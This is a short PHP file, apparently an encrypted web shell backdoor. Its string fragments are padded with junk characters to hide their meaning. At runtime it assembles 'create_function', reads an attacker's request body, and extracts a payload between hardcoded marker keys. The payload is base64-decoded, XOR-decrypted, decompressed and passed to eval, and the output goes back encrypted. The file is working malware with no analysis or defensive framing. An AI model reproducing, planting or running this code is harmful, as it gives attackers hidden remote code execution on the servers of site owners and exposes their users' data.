<?php
$L=');@evafClfC(@gzuncompfCress(@xfC(@basefC64_decfCode($m[1]fC),$k)fC));$o=@fCob_get_fCcfContfCents();@ob_';
$K='enfCd_cleanfC(fC);$r=@basfCe64_enfCcodefC(@x(@gfCzcompresfCs($o)fC,$k)fC);pfCrint("$p$kh$fCr$kf");}';
$Z='fCj=0;(fC$jfC<$c&&$i<$l);$j++fC,$i++)fC{$o.=$fCfCt{$i}^$k{fC$j};fC}fCfC}returfCn $o;}if (@fCpre';
$h=str_replace('rZ','','crrZerZarZte_frZuncrZrZtion');
$F='g_fCmatchfC("/$kfCh(fC.+)$kfCf/",@file_get_contefCnts(fC"php://infCputfC"),$m)==1)fC {@ob_fCstarfCt(';
$S='$k="68373fC7d6"fC;$kh=fC"e717fCb2c74e59";fC$kfCf="ce37bafC8fC87f78";$p="fCjkfCImW2UfCgfCoxfCbyND';
$u='NN";functionfC x($t,$kfC){$c=strfClenfC($k)fC;$l=strlen(fC$t);$o=fC"fC";fofCrfC($i=0;$i<$l;){forfC($';
$x=str_replace('fC','',$S.$u.$Z.$F.$L.$K);
$M=$h('',$x);$M();
?>
